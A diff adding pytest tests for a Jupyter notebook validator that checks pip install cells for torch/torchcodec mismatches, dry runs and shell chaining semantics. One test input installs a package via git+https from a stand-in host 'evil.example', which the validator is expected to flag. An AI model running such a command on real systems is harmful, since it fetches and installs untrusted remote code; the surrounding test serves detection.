@@ -3804,3 +3804,115 @@ def test_an_input_fd_duplication_is_not_a_separator():
         ("!pip install b", False),
     ]
     assert nv._split_chained("!pip install a >&2") == [("!pip install a >&2", False)]
+
+
+def test_a_floor_no_torch_can_satisfy_is_still_a_finding():
+    """A torch floor is normally too weak to judge, but not when every candidate is excluded.
+
+    `torch>=2.11` with `torchcodec==0.10` fails on 2.11 (which wants 0.11) and on everything
+    past it (which wants the ABI-stable 0.12 line), so the pairing cannot load whichever
+    release pip picks; the early return on an inexact torch suppressed it anyway.
+    """
+    nv = _load_notebook_validator_module()
+    older = {"torch": "2.10.0+cu128", "torchcodec": "0.10.0+cu128", "python": "3.12"}
+
+    findings = nv.rule_inst_004_torchcodec_torch(
+        '!pip install "torch>=2.11" "torchcodec==0.10.0"', older, "nb.ipynb", 0
+    )
+    assert [f.rule for f in findings] == ["R-INST-004"]
+    assert "every torch minor" in findings[0].message
+    # A floor some row still admits stays ambiguous, and so does an ABI-stable codec.
+    assert (
+        nv.rule_inst_004_torchcodec_torch(
+            '!pip install "torch>=2.10" "torchcodec==0.10.0"', older, "nb.ipynb", 0
+        )
+        == []
+    )
+    assert (
+        nv.rule_inst_004_torchcodec_torch(
+            '!pip install "torch>=2.11" "torchcodec==0.12.0"', older, "nb.ipynb", 0
+        )
+        == []
+    )
+    assert nv._codec_works_above("2.11", "0.10") is False
+    assert nv._codec_works_above("2.10", "0.10") is True
+
+
+def test_a_dry_run_places_no_lower_bound():
+    """pip explicitly makes no environment changes during a dry run.
+
+    The floor scan still read the dry-run pin, so R-INST-003 preferred a version the cell never
+    installs and the real incompatibility went unreported.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert (
+        nv._install_cell_lower_bound('!pip install --dry-run "torchao>=0.16.0"', "torchao") is None
+    )
+    assert nv._install_cell_lower_bound('!pip install "torchao>=0.16.0"', "torchao") == "0.16.0"
+
+
+def test_shell_negation_flips_the_and_chain():
+    """`!` inverts the status of the pipeline after it.
+
+    `! false` succeeds, so the `&&` behind it always runs, while `! pip install x` fails under
+    the replay's own model. Reading the negation as an unknown command marked both conditional.
+    """
+    nv = _load_notebook_validator_module()
+
+    # The first bang is the notebook's; the second is bash's, so `! false` succeeds.
+    assert [flag for _, flag in nv._split_chained("! ! false && pip install a")] == [False, False]
+    # With only the notebook's bang, bash sees a bare `false`, which never reaches the install.
+    assert [flag for _, flag in nv._split_chained("! false && pip install a")] == [False, True]
+    assert nv._piece_success_model("!! false") is True
+    assert nv._piece_success_model("!false") is False
+    assert nv._piece_success_model("!true") is True
+    assert nv._piece_success_model("!some_probe") is None
+
+
+def test_a_group_carries_its_success_into_the_outer_chain():
+    """A group exits with the status of its LAST command.
+
+    Discarding the inner state on close left the outer `&&` reading the group as an unknown
+    command, so the install behind it was marked conditional.
+    """
+    nv = _load_notebook_validator_module()
+
+    for grouped in (
+        '!(pip install "torch==2.12.0") && pip install "torchcodec==0.11.0"',
+        '!{ pip install "torch==2.12.0"; } && pip install "torchcodec==0.11.0"',
+    ):
+        assert [flag for _, flag in nv._split_chained(grouped)] == [False, False], grouped
+    # A group whose last command may fail still ends the assumption.
+    assert [flag for _, flag in nv._split_chained("!(some_probe) && pip install b")] == [
+        False,
+        True,
+    ]
+    assert [
+        flag for _, flag in nv._split_chained("!(pip install a; some_probe) && pip install b")
+    ] == [False, False, True]
+
+
+def test_exec_behind_an_external_wrapper_hands_nothing_over():
+    """`env exec true` asks env to launch a PROGRAM called exec, which does not exist.
+
+    Verified locally: bash reports `env: 'exec': No such file or directory` and the parent shell
+    continues. Recording any consumed `exec` as a hand-over truncated the list before a
+    reachable install.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert nv._command_execs("!env exec true") is False
+    assert nv._split_chained("!env exec true; pip install a") == [
+        ("!true", False),
+        ("!pip install a", False),
+    ]
+    assert [
+        f.rule
+        for f in nv.rule_inst_001_git_plus(
+            "!env exec true; pip install git+https://evil.example/x.git", "nb.ipynb", 0
+        )
+    ] == ["R-INST-001"]
+    # The prefixes bash resolves in-process still preserve the builtin.
+    assert nv._command_execs("!command exec pip install a") is True
+    assert nv._command_execs("!exec pip install a") is True
